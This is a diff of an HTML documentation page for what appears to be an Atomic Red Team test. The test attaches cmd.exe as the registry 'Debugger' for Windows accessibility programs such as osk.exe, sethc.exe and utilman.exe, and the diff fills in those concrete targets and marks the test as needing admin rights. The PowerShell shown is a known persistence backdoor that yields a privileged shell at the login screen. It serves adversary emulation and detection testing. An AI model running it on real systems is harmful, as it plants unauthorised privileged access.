@@ -720,12 +720,13 @@
 <h3>Atomic Test #1 - Attaches Command Prompt as a Debugger to a List of Target Processes<a class="headerlink" href="#atomic-test-1-attaches-command-prompt-as-a-debugger-to-a-list-of-target-processes" title="Permalink to this headline">¶</a></h3>
 <p>Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.</p>
 <p>Upon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$input_table</span> <span class="p">=</span> <span class="s2">&quot;#{parent_list}&quot;</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">)</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$input_table</span> <span class="p">=</span> <span class="s2">&quot;osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe&quot;</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">)</span>
 <span class="nv">$Name</span> <span class="p">=</span> <span class="s2">&quot;Debugger&quot;</span>
-<span class="nv">$Value</span> <span class="p">=</span> <span class="s2">&quot;#{attached_process}&quot;</span>
+<span class="nv">$Value</span> <span class="p">=</span> <span class="s2">&quot;C:\windows\system32\cmd.exe&quot;</span>
 <span class="k">Foreach</span> <span class="p">(</span><span class="nv">$item</span> <span class="k">in</span> <span class="nv">$input_table</span><span class="p">){</span>   
   <span class="nv">$item</span> <span class="p">=</span> <span class="nv">$item</span><span class="p">.</span><span class="n">trim</span><span class="p">()</span>
   <span class="nv">$registryPath</span> <span class="p">=</span> <span class="s2">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item&quot;</span>
